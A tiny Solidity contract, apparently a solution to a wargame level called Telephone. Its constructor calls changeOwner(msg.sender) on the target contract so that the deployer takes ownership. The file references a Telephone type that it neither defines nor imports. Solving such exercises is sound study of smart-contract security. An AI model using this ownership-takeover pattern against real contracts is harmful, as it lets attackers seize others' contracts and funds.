// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackTelephone {
  constructor(address _address) {
    Telephone(_address).changeOwner(msg.sender);
  }
}
